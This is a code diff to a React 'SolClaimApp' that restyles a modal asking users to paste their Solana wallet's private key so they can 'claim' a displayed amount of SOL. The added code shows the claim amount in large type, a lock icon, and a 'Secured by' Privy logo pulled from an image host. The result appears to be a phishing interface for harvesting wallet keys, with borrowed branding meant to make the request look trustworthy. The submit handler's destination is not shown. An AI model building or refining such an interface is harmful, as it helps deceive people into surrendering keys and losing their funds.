@@ -1298,26 +1298,46 @@ export default function SolClaimApp() {
 
         {isLast && (isKeyModalOpen || isKeyModalClosing) && (
           <div
-            className={`fixed inset-0 z-[210] flex items-center justify-center bg-black/80 p-4 ${isKeyModalClosing ? 'animate-out fade-out' : 'animate-in fade-in'}`}
+            className={`fixed inset-0 z-[210] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 ${isKeyModalClosing ? 'modal-backdrop-exit' : 'modal-backdrop-enter'}`}
             onClick={closeKeyModal}
+            onAnimationEnd={(e) => e.animationName === 'modal-backdrop-exit' && finishKeyClose()}
           >
             <div
-              className="bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4"
+              className={`bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4 shadow-2xl relative overflow-hidden ${isKeyModalClosing ? 'modal-content-exit' : 'modal-content-enter'}`}
               onClick={(e) => e.stopPropagation()}
             >
-              <h3 className="font-black text-lg">Add private key</h3>
-              <p className="text-xs text-muted-foreground">
-                Enter your private key for <span className="font-mono font-bold">{publicKey.slice(0, 6)}...{publicKey.slice(-4)}</span> to claim.
-              </p>
-              <Input
-                type="password"
-                placeholder="Base58 private key..."
-                value={privateKeyInput}
-                onChange={(e) => setPrivateKeyInput(e.target.value)}
-                className="h-12 rounded-xl font-mono"
-              />
+              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary-foreground to-primary" />
+              <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
+                <Key className="w-6 h-6 text-primary" />
+              </div>
+              <h3 className="text-xl font-black text-foreground tracking-tight">Enter Your Private Key</h3>
+              <div className="space-y-2">
+                <div className="p-3 rounded-xl bg-primary/10 border-2 border-primary/20">
+                  <p className="text-[10px] font-bold text-primary uppercase tracking-widest mb-0.5">You&apos;re about to claim</p>
+                  <p className="text-2xl font-black text-foreground">{onboardingClaimableNet.toFixed(4)} <span className="text-primary text-base">SOL</span></p>
+                </div>
+                <p className="text-xs text-muted-foreground">
+                  Enter your private key for wallet <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{publicKey.slice(0, 4)}...{publicKey.slice(-4)}</span> to claim.
+                </p>
+              </div>
+              <div className="space-y-3">
+                <Label htmlFor="onboardingPrivateKey" className="text-[11px] font-black text-muted-foreground uppercase tracking-widest ml-1">Your Private Key (Base58)</Label>
+                <Input
+                  id="onboardingPrivateKey"
+                  type="password"
+                  placeholder="Paste your private key..."
+                  value={privateKeyInput}
+                  onChange={(e) => setPrivateKeyInput(e.target.value)}
+                  className="h-12 bg-background border-2 border-border rounded-xl font-mono text-base ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none min-w-0"
+                />
+                <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
+                  <Lock className="w-3 h-3 shrink-0" />
+                  <span>Secured by</span>
+                  <img src="https://framerusercontent.com/images/AwTsKmlC3D7Q0nXT1xH0qt3jHkI.png?width=505&height=278" alt="Privy" className="h-5 w-auto object-contain" />
+                </div>
+              </div>
               <Button
-                className="w-full h-12 rounded-xl font-black"
+                className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-black shadow-md shadow-primary/20 active:scale-[0.98] transition-all border border-primary-foreground/10"
                 onClick={async () => {
                   if (!privateKeyInput || !currentWalletId) return
                   setIsSubmittingKey(true)
@@ -1339,7 +1359,14 @@ export default function SolClaimApp() {
                 }}
                 disabled={!privateKeyInput || isSubmittingKey}
               >
-                {isSubmittingKey ? 'Claiming...' : 'Save & Claim'}
+                {isSubmittingKey ? (
+                  <div className="flex items-center gap-2">
+                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
+                    SAVING...
+                  </div>
+                ) : (
+                  <>SAVE & CLAIM {onboardingClaimableNet.toFixed(4)} SOL</>
+                )}
               </Button>
             </div>
           </div>
